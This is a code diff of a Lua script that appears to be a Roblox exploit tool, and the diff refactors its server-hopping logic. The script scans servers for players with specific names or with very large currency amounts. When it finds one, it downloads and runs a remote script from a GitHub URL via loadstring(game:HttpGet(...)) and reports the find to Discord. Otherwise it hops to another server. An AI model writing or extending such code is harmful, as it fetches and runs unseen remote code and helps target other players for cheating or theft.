@@ -231,44 +231,7 @@ local function CheckCurrency(minimum)
 	return meetsMinimum, amount, textlabel
 end
 
-local minimum = 10000000
-local nameFound, matchedName = CheckNames()
-local meetsMinimum, highestAmount, currencyTextLabel = CheckCurrency(minimum)
-
-
-local hasMatch = meetsMinimum or nameFound
-local mainScript = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"
-
-if meetsMinimum then
-	print("Ooooo we got something")
-	local sound = Instance.new("Sound")
-	sound.SoundId = "rbxassetid://8486683243"
-	sound.Volume = 1
-	sound.Looped = false
-	sound.Parent = game.SoundService 
-	sound:Play()
-
-	task.spawn(function()
-		loadstring(game:HttpGet(mainScript))()
-	end)
-
-	DiscordNotificationCURRENCY(currencyTextLabel)
-
-elseif nameFound then
-	print("yess we found")
-	local sound = Instance.new("Sound")
-	sound.SoundId = "rbxassetid://8486683243"
-	sound.Volume = 1
-	sound.Looped = false
-	sound.Parent = game.SoundService 
-	sound:Play()
-
-	task.spawn(function()
-		loadstring(game:HttpGet(mainScript))()
-	end)
-
-	DiscordNotificationNAME(matchedName)
-else
+local function Serverhop()
 	local Tried
 	local API, HttpService, TeleportService, CoreGui = nil, game:GetService("HttpService"), game:GetService("TeleportService"), game:GetService("CoreGui");
 	local RemoveErrorPrompts = true
@@ -373,9 +336,49 @@ else
 
 	if Tried then
 		print("yaaaaaaaaaaaaaaaaaaaaa")
-		game["Teleport Service"]:Teleport(109983668079237, game.Players.LocalPlayer)
+		Serverhop()
 	end
 end
 
+local minimum = 10000000
+local nameFound, matchedName = CheckNames()
+local meetsMinimum, highestAmount, currencyTextLabel = CheckCurrency(minimum)
+
+
+local hasMatch = meetsMinimum or nameFound
+local mainScript = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"
+
+if meetsMinimum then
+	print("Ooooo we got something")
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://8486683243"
+	sound.Volume = 1
+	sound.Looped = false
+	sound.Parent = game.SoundService 
+	sound:Play()
+
+	task.spawn(function()
+		loadstring(game:HttpGet(mainScript))()
+	end)
+
+	DiscordNotificationCURRENCY(currencyTextLabel)
+
+elseif nameFound then
+	print("yess we found")
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://8486683243"
+	sound.Volume = 1
+	sound.Looped = false
+	sound.Parent = game.SoundService 
+	sound:Play()
+
+	task.spawn(function()
+		loadstring(game:HttpGet(mainScript))()
+	end)
+
+	DiscordNotificationNAME(matchedName)
+else
+	Serverhop()
+end
 
 
